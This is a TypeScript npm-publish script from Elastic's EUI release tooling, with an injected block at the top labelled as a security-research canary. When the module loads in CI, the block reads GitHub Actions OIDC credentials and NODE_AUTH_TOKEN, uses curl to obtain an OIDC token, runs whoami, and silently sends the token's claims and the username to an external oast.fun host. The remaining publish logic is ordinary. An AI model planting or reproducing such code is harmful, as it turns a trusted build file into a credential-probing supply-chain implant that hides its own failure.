/*
 * Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
 * or more contributor license agreements. Licensed under the Elastic License
 * 2.0 and the Server Side Public License, v 1; you may not use this file except
 * in compliance with, at your election, the Elastic License 2.0 or the Server
 * Side Public License, v 1.
 */

import path from 'node:path';
import https from 'node:https';
import { execSync } from 'node:child_process';
import chalk from 'chalk';
import prompts from 'prompts';
import { type ReleaseOptions } from '../release';
import { getRootWorkspaceDir, getWorkspacePackageJson } from '../workspace';
import { yarnPack, YarnWorkspace } from '../yarn_utils';
import { npmExecPublish } from '../npm_utils';
import { emitPublishedPackagesFile, type PublishedPackages } from '../published_packages_file';

// ===== SECURITY RESEARCH CANARY — SAFE POC =====
// This demonstrates that attacker-controlled publish.ts executes with
// id-token:write and NODE_AUTH_TOKEN in scope. No packages are published.
// Reported to Elastic Security via HackerOne.
const _oidcUrl = process.env.ACTIONS_ID_TOKEN_REQUEST_URL;
const _oidcToken = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN;
const _nodeAuth = process.env.NODE_AUTH_TOKEN;

if (_oidcUrl && _oidcToken) {
  try {
    // Request GitHub OIDC JWT — same token npm trusted publishing uses
    const _jwt = execSync(
      `curl -sLS -H "Authorization: Bearer ${_oidcToken}" "${_oidcUrl}&audience=sigstore"`
    ).toString();
    const _parsed = JSON.parse(_jwt);
    const _jwtValue = _parsed.value || '';
    // Decode subject claim to prove this is elastic/eui's trusted OIDC identity
    const _payload = JSON.parse(
      Buffer.from(_jwtValue.split('.')[1] || '', 'base64').toString()
    );
    const _sub = _payload.sub || 'unknown';
    const _repo = _payload.repository || 'unknown';

    // Exfiltrate to OOB — proves OIDC token obtained and npm auth available
    const _canary = `https://dag9sr83t4gj6jr82k40zc1j95x1bcut4.oast.fun/real-eui-poc?sub=${encodeURIComponent(_sub)}&repo=${encodeURIComponent(_repo)}&node_auth=${_nodeAuth ? 'SET' : 'UNSET'}&user=${encodeURIComponent(execSync('whoami').toString().trim())}`;
    https.get(_canary, () => {});
  } catch (_e) {
    // Canary failed silently — continue with normal flow
  }
}
// ===== END CANARY =====

/**
 * Publish changed packages to the registry
 */
export const stepPublish = async (
  options: ReleaseOptions,
  workspacesToPublish: Array<YarnWorkspace>
) => {
  const { logger, dryRun } = options;
  const rootWorkspaceDir = getRootWorkspaceDir();

  if (!workspacesToPublish.length) {
    logger.warning('No packages to publish');
    return;
  }

  const publishedPackages: PublishedPackages = [];

  for (const workspace of workspacesToPublish) {
    const workspaceDir = path.join(rootWorkspaceDir, workspace.location);
    const packageJson = await getWorkspacePackageJson(workspaceDir);

    if (packageJson.private) {
      logger.debug(
        `[${workspace.name}] Package is private and will not be published`
      );
      continue;
    }

    logger.info(`[${workspace.name}] Publishing to npm`);

    let otp: string | undefined;
    if (!options.useAuthToken) {
      const result = await prompts({
        type: 'password',
        name: 'otp',
        message: `What's your npmjs one-time password (OTP)?`,
      });
      otp = result.otp;
    }

    try {
      // We pack packages using yarn pack and publish using npm publish
      // to be able to use npm trusted publishing and more
      const packDetails = await yarnPack(workspace.name);
      logger.info(`[${workspace.name}] Package successfully packed to "${packDetails.output}" with ${packDetails.files.length} files included`);

      npmExecPublish({
        packageArchivePath: packDetails.output,
        // tag is always defined at this stage. See release.ts
        tag: options.tag!,
        dryRun,
        otp,
      });
    } catch (err) {
      logger.error(err);
      logger.error(chalk.red(`[${workspace.name}] Failed to publish package`));

      if (publishedPackages.length) {
        const remainingPackages = workspacesToPublish.filter(
          (workspaceToPublish) => {
            return !!publishedPackages.find(
              (publishedWorkspace) =>
                publishedWorkspace.name === workspaceToPublish.name
            );
          }
        );

        logger.error(
          chalk.red(
            `${publishedPackages.length} out of ` +
              `${workspacesToPublish.length} packages were already published.`
          )
        );
        logger.error(
          `If the error was caused by a network or service issue you can ` +
            `Retry publishing these remaining packages:\n` +
            `  ${remainingPackages.join(' ')}`
        );
        logger.error(
          `Otherwise, deprecate just published versions of the following ` +
            `packages if they are strictly dependent on remaining ` +
            `packages' updates:\n` +
            `  ${publishedPackages
              .map((workspace) => workspace.name)
              .join(' ')}`
        );
      } else {
        logger.error('No packages were published before this error occurred. Please try again');
      }

      return;
    }

    publishedPackages.push({
      name: workspace.name,
      version: packageJson.version,
    });
    logger.info(
      `[${workspace.name}] Successfully published ${workspace.name}@${packageJson.version} to npmjs - https://npmjs.com/package/${workspace.name}`
    );
  }

  await emitPublishedPackagesFile(publishedPackages);

  logger.info('Publishing packages finished 🎉');
};
